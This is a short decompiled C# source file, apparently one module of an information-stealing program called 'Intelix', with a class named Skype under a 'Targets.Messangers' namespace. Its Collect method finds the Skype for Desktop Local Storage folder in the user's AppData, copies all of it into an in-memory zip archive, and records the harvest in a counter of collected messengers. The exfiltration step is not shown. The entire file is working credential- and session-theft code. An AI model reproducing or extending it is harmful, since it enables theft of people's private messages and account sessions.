using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x0200001F RID: 31
	public class Skype : ITarget
	{
		// Token: 0x0600005D RID: 93 RVA: 0x00004788 File Offset: 0x00002988
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Skype for Desktop", "Local Storage");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Skype";
				string text2 = Path.Combine("Skype", "Local Storage");
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counterApplications.Files.Add("Skype\\");
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
